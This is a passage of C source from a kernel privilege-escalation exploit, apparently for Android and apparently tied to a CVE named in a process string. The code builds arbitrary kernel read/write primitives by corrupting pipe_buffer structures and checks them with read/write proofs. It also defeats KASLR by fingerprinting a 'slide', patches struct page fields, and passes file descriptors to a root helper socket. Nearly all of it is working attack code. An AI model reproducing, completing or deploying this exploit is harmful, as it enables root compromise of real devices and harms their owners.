    rmg_diag("PROVE readback after write failed\n");
    return 0;
  }
  if (memcmp(wbuf, wtag, taglen) != 0) {
    rmg_diag("PROVE write MISMATCH got=%.*s\n", (int)taglen, (char *)wbuf);
    return 0;
  }
  rmg_diag("PROVE write ok addr=%016zx len=%zu\n", proof_addr, taglen);
  return 1;
}

int install_pipe_physrw(int fd) {
  int ok = 0;
  int proof_saved = 0;
  int proof64_saved = 0;
  char saved_proof[sizeof(PHYS_WRITE_TAG)];
  char restored_proof[sizeof(saved_proof)];
  uint64_t saved_proof64 = 0;
  uint64_t restored_proof64 = 0;

  /* Clear the restore latch at the start of every attempt, exactly as the fork does
   * (09_pipe_buffer_rw.c:1776). Ours was set once and never reset, so a single blip in an
   * earlier attempt permanently disabled the deterministic path for the whole process:
   * pipe_walk_resolve_pass() checks the latch before doing anything, so the walk aborted
   * with zero guard cycles on every subsequent try. */
  atomic_store(&g_io_restore_failed, 0);
  /* The victim snapshot is per-attempt state: a stale one from a previous attempt would
   * point at a ring slot this attempt never resolved. */
  pipebuf_saved_valid = 0;
  memset(&pipebuf_saved, 0, sizeof(pipebuf_saved));
  pipebuf_addr = 0;
  pipebuf_page_base = 0;
  pipebuf_pipe_idx = -1;

  /* Deterministic path FIRST, before any heap preparation.
   *
   * Resolving the victim by walking live kernel structures means the order-3
   * grooming child (1216 clones + skb sendmsg + KernelSnitch) is unnecessary, and
   * that child is the stage which panics most often here. So run the walk before
   * waiting on pipe_prepare_*, otherwise the expensive and fragile phase happens
   * for nothing. PIPE_DETERMINISTIC=0 forces the legacy path for comparison. */
  {
    const char *det_env = getenv("PIPE_DETERMINISTIC");
    int deterministic = (det_env && *det_env) ? atoi(det_env) : 1;
    rmg_diag("PHYS deterministic=%d page_base=%016zx pipebuf_page_base=%016zx\n",
             deterministic, page_base, pipebuf_page_base);
    if (deterministic) {
      if (pipe_walk_resolve_deterministic(fd)) {
        rmg_diag("PHYS walk RESOLVED addr=%016zx page=%016zx idx=%d\n", pipebuf_addr,
                 pipebuf_page_base, pipebuf_pipe_idx);
        /* Prove the descriptor before anyone acts on it. The fork makes prove_pipe_rw()
         * mandatory (09_pipe_buffer_rw.c:1801); returning success on the resolve alone
         * hands a completely unverified buffer to the root stage, so any mistake in the
         * scan becomes silent corruption instead of a visible failure. */
        if (!pipe_walk_prove_descriptors(fd)) {
          rmg_diag("PHYS walk resolved but the descriptor proof FAILED\n");
          return 0;
        }
        rmg_diag("PHYS descriptor proof OK\n");
        return 1;
      }
      if (atomic_load(&g_io_restore_failed)) {
        /* A latched restore means a live slab page may still point at our fake descriptor.
         * Do NOT escalate into the legacy groom path here: that stage is 1216 clones plus
         * skb reclaim and is the most panic-prone code in the tree. Abort the attempt. */
        rmg_diag("PHYS walk left the restore latch set; aborting attempt\n");
        return 0;
      }
      rmg_diag("PHYS walk failed; falling back to legacy groom+scan\n");
    }
  }

  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof64_addr = proof_addr + 0x100;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1)) ||
      sizeof(PHYS_READ_TAG) > PAGE_SIZE - (proof_addr & (PAGE_SIZE - 1)) ||
      sizeof(saved_proof) > PAGE_SIZE - (proof_addr & (PAGE_SIZE - 1)) ||
      sizeof(saved_proof64) >
          PAGE_SIZE - (proof64_addr & (PAGE_SIZE - 1)) ||
      (proof_addr & ~(PAGE_SIZE - 1)) !=
          (proof64_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
            candidate_slab_cache, kmalloc_pipe_cache);
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_read_data(fd, proof_addr, saved_proof, sizeof(saved_proof)) !=
      (ssize_t)sizeof(saved_proof)) {
    pr_error("phys proof old read failed addr=%016zx size=%zu\n",
             proof_addr, sizeof(saved_proof));
    goto cleanup;
  }
  proof_saved = 1;
  if (kernel_read_data(fd, proof64_addr, &saved_proof64,
                       sizeof(saved_proof64)) !=
      (ssize_t)sizeof(saved_proof64)) {
    pr_error("phys proof64 old read failed addr=%016zx\n", proof64_addr);
    goto cleanup;
  }
  proof64_saved = 1;
  pr_info("phys proof spans data=%016zx-%016zx qword=%016zx-%016zx\n",
          proof_addr, proof_addr + sizeof(saved_proof) - 1,
          proof64_addr, proof64_addr + sizeof(saved_proof64) - 1);
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    goto cleanup;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  if (kernel_read_data(fd, proof_addr, physrw_after_write,
                       sizeof(overwrite)) != (ssize_t)sizeof(overwrite)) {
    goto cleanup;
  }

  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
      (ssize_t)sizeof(seed64)) {
    goto cleanup;
  }
  if (!pipe_read64_checked(fd, proof64_addr, &physrw_read64_before)) {
    goto cleanup;
  }
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  if (kernel_read_data(fd, proof64_addr, &physrw_read64_after,
                       sizeof(physrw_read64_after)) !=
      (ssize_t)sizeof(physrw_read64_after)) {
    goto cleanup;
  }
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  ok = physrw_read_ok &&
       memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
       physrw_write_ok &&
       memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
       physrw_read64_ok && physrw_write64_ok;

cleanup:
  if (proof64_saved) {
    int write_ok = kernel_write_data(fd, proof64_addr, &saved_proof64,
                                     sizeof(saved_proof64)) ==
                   (ssize_t)sizeof(saved_proof64);
    int read_ok = kernel_read_data(fd, proof64_addr, &restored_proof64,
                                   sizeof(restored_proof64)) ==
                  (ssize_t)sizeof(restored_proof64);
    int restore_ok = write_ok && read_ok &&
                     restored_proof64 == saved_proof64;
    pr_info("phys proof64 restore=%d old=%016llx now=%016llx\n",
            restore_ok, (unsigned long long)saved_proof64,
            (unsigned long long)restored_proof64);
    ok &= restore_ok;
  }
  if (proof_saved) {
    int write_ok = kernel_write_data(fd, proof_addr, saved_proof,
                                     sizeof(saved_proof)) ==
                   (ssize_t)sizeof(saved_proof);
    int read_ok = kernel_read_data(fd, proof_addr, restored_proof,
                                   sizeof(restored_proof)) ==
                  (ssize_t)sizeof(restored_proof);
    int restore_ok = write_ok && read_ok &&
                     memcmp(restored_proof, saved_proof,
                            sizeof(saved_proof)) == 0;
    pr_info("phys proof restore=%d size=%zu\n",
            restore_ok, sizeof(saved_proof));
    ok &= restore_ok;
  }
  return ok;
}

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int pipe_write_full(int fd, const void *data, size_t size) {
  const unsigned char *cursor = data;
  while (size) {
    ssize_t wrote = write(fd, cursor, size);
    if (wrote <= 0) {
      return 0;
    }
    cursor += wrote;
    size -= (size_t)wrote;
  }
  return 1;
}

static int pipe_read_full(int fd, void *data, size_t size) {
  unsigned char *cursor = data;
  while (size) {
    ssize_t got = read(fd, cursor, size);
    if (got <= 0) {
      return 0;
    }
    cursor += got;
    size -= (size_t)got;
  }
  return 1;
}

static int pipe_duplicate_bytes(
    int source_fd, int holder[2], size_t size, size_t slots) {
  SYSCHK(pipe(holder));
  resize_pipe_slots(holder, slots);
  errno = 0;
  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
  return duplicated == (ssize_t)size;
}

static int transfer_p0_references_to_root(int retained_pipe_index) {
  int retained_fds[] = {
    pipe_fds_reclaim[retained_pipe_index][0],
    p0_gate_holders[retained_pipe_index][0],
    reclaim_receiver_fd(),
  };
  for (size_t index = 0;
       index < sizeof(retained_fds) / sizeof(retained_fds[0]); index++) {
    if (retained_fds[index] < 0) {
      return 0;
    }
  }

  int socket_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (socket_fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s",
           "/data/local/tmp/temp_su.sock");
  if (connect(socket_fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
    close(socket_fd);
    return 0;
  }

  char allowed = 0;
  char operation = 'H';
  if (!pipe_read_full(socket_fd, &allowed, sizeof(allowed)) || allowed != 'A' ||
      !pipe_write_full(socket_fd, &operation, sizeof(operation))) {
    close(socket_fd);
    return 0;
  }

  char marker = 'P';
  struct iovec iov = {
    .iov_base = &marker,
    .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(retained_fds))];
  struct msghdr message;
  memset(&message, 0, sizeof(message));
  memset(control, 0, sizeof(control));
  message.msg_iov = &iov;
  message.msg_iovlen = 1;
  message.msg_control = control;
  message.msg_controllen = sizeof(control);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
  memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker)) {
    close(socket_fd);
    return 0;
  }

  char acknowledged = 0;
  int transferred = pipe_read_full(
      socket_fd, &acknowledged, sizeof(acknowledged)) && acknowledged == 'K';
  close(socket_fd);
  return transferred;
}

static void spawn_p0_ref_keeper(int retained_pipe_index) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    pr_info("p0 reference keeper pid=%d pipe=%d\n",
            child, retained_pipe_index);
    return;
  }
  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-p0ref", 0, 0, 0);
  syscall(SYS_setsid);
  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (fd != null_fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  }
  if (retained_pipe_index >= 0) {
    for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
      if ((int)pipe_index != retained_pipe_index) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][0]);
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
        syscall(SYS_close, p0_gate_holders[pipe_index][0]);
        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
        continue;
      }
      syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
      syscall(SYS_close, p0_gate_holders[pipe_index][1]);
    }
  }
  if (retained_pipe_index < 0) {
    for (;;) {
      pause();
    }
  }
  for (;;) {
    if (transfer_p0_references_to_root(retained_pipe_index)) {
      _exit(0);
    }
    usleep(10000);
  }
}

void start_p0_ref_keeper(void) {
  if (p0_gate_holders_initialized) {
    return;
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    p0_gate_holders[i][0] = -1;
    p0_gate_holders[i][1] = -1;
  }
  if (pipe2(p0_gate_holders[0], O_CLOEXEC) < 0) {
    pr_error("p0 ref keeper gate pipe failed errno=%d\n", errno);
    return;
  }
  p0_gate_holders_initialized = 1;
  spawn_p0_ref_keeper(0);
}

int prepare_p0_pipe_oracle(void) {
  _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                 "unexpected pipe_buffer size");

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    p0_gate_holders[pipe_index][0] = -1;
    p0_gate_holders[pipe_index][1] = -1;
  }
  p0_gate_holders_initialized = 1;

  pipebuf_page_base = prepare_pipe_buffer_page();
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      return 0;
    }
  }
  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
          pipebuf_page_base, PIPE_RECLAIM);
  return 1;
}

int expand_p0_pipe_oracle(void) {
  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
      if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                           sizeof(marker))) {
        return 0;
      }
    }
  }
  pr_info("p0 pipe oracle expanded pipes=%d slots=%d\n",
          PIPE_RECLAIM, PIPE_BUFFER_SLOTS);
  return 1;
}

int verify_p0_pipe_oracle_gate(void) {
  unsigned char page[PAGE_SIZE];
  int gate_hits = 0;
  int gate_pipe_index = -1;
  int changed_pages = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  p0_gate_holders_initialized = 1;
#endif
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    size_t gate_offset = PAGE_SIZE;
    for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
      if (memcmp(page + offset, "RMG-P0-ORACLE-GATE", 18) == 0) {
        gate_offset = offset;
        break;
      }
    }
    if (gate_offset != PAGE_SIZE) {
      gate_hits++;
      gate_pipe_index = (int)pipe_index;
      pr_info("p0 gate marker pipe=%zu offset=%zu\n",
              pipe_index, gate_offset);
    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
      changed_pages++;
      uint64_t words[8];
      memcpy(words, page, sizeof(words));
      pr_info("p0 gate changed pipe=%zu q0=%016llx q1=%016llx "
              "q2=%016llx q3=%016llx q4=%016llx q5=%016llx "
              "q6=%016llx q7=%016llx\n",
              pipe_index,
              (unsigned long long)words[0],
              (unsigned long long)words[1],
              (unsigned long long)words[2],
              (unsigned long long)words[3],
              (unsigned long long)words[4],
              (unsigned long long)words[5],
              (unsigned long long)words[6],
              (unsigned long long)words[7]);
    }
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
  }
  pr_info("p0 pipe gate hits=%d changed=%d\n",
          gate_hits, changed_pages);
  if (gate_hits != 0 || changed_pages != 0) {
    spawn_p0_ref_keeper(
        gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
  }
  if (gate_hits == 1 && changed_pages == 0) {
    return 1;
  }
  if (gate_hits == 0 && changed_pages == 0) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    close_p0_gate_holders();
#endif
    return 0;
  }
  return -1;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected) {
  unsigned char page[PAGE_SIZE];
  size_t target_offset = target & (PAGE_SIZE - 1);
  int changed_pages = 0;
  int exact_matches = 0;
  uint64_t observed = 0;

  if (target_offset + sizeof(observed) > sizeof(page)) {
    return -1;
  }
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      pr_warning("fops data alias read failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      return -1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    memcpy(&observed, page + target_offset, sizeof(observed));
    if (observed == expected) {
      exact_matches++;
    }
    pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
            "observed=%016llx expected=%016llx match=%d\n",
            pipe_index, target, target_offset,
            (unsigned long long)observed,
            (unsigned long long)expected, observed == expected);
  }
  pr_info("fops data alias changed=%d exact=%d target=%016zx "
          "observed=%016llx expected=%016llx\n",
          changed_pages, exact_matches, target,
          (unsigned long long)observed, (unsigned long long)expected);
  if (changed_pages == 1 && exact_matches == 1) {
    return 1;
  }
  return changed_pages == 0 ? 0 : -1;
}
#endif

static int p0_fingerprint_score(
    const unsigned char *page, const struct p0_fingerprint *fingerprint) {
  int score = 0;
  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
    uint64_t value = 0;
    memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
    if (value == fingerprint->words[index]) {
      score++;
    }
  }
  return score;
}

uintptr_t scan_p0_pipe_oracle(void) {
  unsigned char page[PAGE_SIZE];
  size_t scan_size =
      p0_fingerprint_offsets[P0_FINGERPRINT_WORDS - 1] + sizeof(uint64_t);
  uintptr_t best_slide = (uintptr_t)-1;
  int best_score = -1;
  int second_score = -1;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        scan_size)) {
      pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
                 pipe_index, scan_size, errno);
      return (uintptr_t)-1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }

    changed_pages++;
    uint64_t sampled_words[P0_FINGERPRINT_WORDS];
    for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
      memcpy(&sampled_words[word], page + p0_fingerprint_offsets[word],
             sizeof(sampled_words[word]));
    }
    pr_info("p0 fingerprint sample "
            "w0=%016llx w1=%016llx w2=%016llx w3=%016llx "
            "w4=%016llx w5=%016llx w6=%016llx w7=%016llx\n",
            (unsigned long long)sampled_words[0],
            (unsigned long long)sampled_words[1],
            (unsigned long long)sampled_words[2],
            (unsigned long long)sampled_words[3],
            (unsigned long long)sampled_words[4],
            (unsigned long long)sampled_words[5],
            (unsigned long long)sampled_words[6],
            (unsigned long long)sampled_words[7]);
    for (size_t index = 0;
         index < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
         index++) {
      int score = p0_fingerprint_score(page, &p0_fingerprints[index]);
      if (score > best_score) {
        second_score = best_score;
        best_score = score;
        best_slide = p0_fingerprints[index].slide;
      } else if (score > second_score) {
        second_score = score;
      }
    }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d "
            "source_offset=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
#else
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d slide=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
#endif
  }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  pr_info("p0 fingerprint changed=%d best=%d second=%d "
          "source_offset=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
#else
  pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
#endif
  if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
    return (uintptr_t)-1;
  }
  return best_slide;
}

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
uint64_t scan_p0_virtual_base_pointer(void) {
  unsigned char page[PAGE_SIZE];
  size_t pointer_offset = data_addr(ASHMEM_MISC_FOPS) & (PAGE_SIZE - 1);
  size_t read_size = pointer_offset + sizeof(uint64_t);
  uint64_t pointer = 0;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page, read_size)) {
      pr_warning("p0 virtual probe partial read failed pipe=%zu size=%zu "
                 "errno=%d\n", pipe_index, read_size, errno);
      return 0;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    memcpy(&pointer, page + pointer_offset, sizeof(pointer));
    pr_info("p0 virtual probe pipe=%zu offset=%zu pointer=%016llx\n",
            pipe_index, pointer_offset, (unsigned long long)pointer);
  }

  pr_info("p0 virtual probe changed=%d pointer=%016llx\n",
          changed_pages, (unsigned long long)pointer);
  if (changed_pages != 1 || (pointer >> 48) != 0xffff) {
    return 0;
  }
  return pointer;
}
#endif

int restore_p0_oracle_pages(int fd) {
  if (!p0_gate_page_struct && !p0_probe_page_struct) {
    return 1;
  }
  if (!p0_gate_page_struct || !p0_probe_page_struct) {
    return 0;
  }
  uintptr_t pages[] = {
    p0_gate_page_struct,
    p0_probe_page_struct,
  };
  uint64_t zero = 0;
  int restored = 1;

  for (size_t index = 0; index < sizeof(pages) / sizeof(pages[0]); index++) {
    uintptr_t compound_head = pages[index] + STRUCT_PAGE_COMPOUND_HEAD_OFF;
    uint64_t before = 0;
    uint64_t after = UINT64_MAX;
    ssize_t read_before = configfs_read_once(
        fd, compound_head, &before, sizeof(before));
    int write_needed = read_before == (ssize_t)sizeof(before) && before != 0;
    ssize_t write_ret = 0;
    ssize_t read_after = -1;
    if (write_needed) {
      write_ret = configfs_write_once(
          fd, compound_head, &zero, sizeof(zero));
    }
    if (read_before == (ssize_t)sizeof(before) &&
        (!write_needed || write_ret == (ssize_t)sizeof(zero))) {
      read_after = configfs_read_once(
          fd, compound_head, &after, sizeof(after));
    }
    pr_info("p0 restore page=%016zx read=%zd needed=%d write=%zd "
            "verify=%zd before=%016llx after=%016llx\n",
            pages[index], read_before, write_needed, write_ret, read_after,
            (unsigned long long)before, (unsigned long long)after);
    if (read_before != (ssize_t)sizeof(before) ||
        (write_needed && write_ret != (ssize_t)sizeof(zero)) ||
        read_after != (ssize_t)sizeof(after) || after != 0) {
      restored = 0;
    }
  }
  return restored;
}
#endif
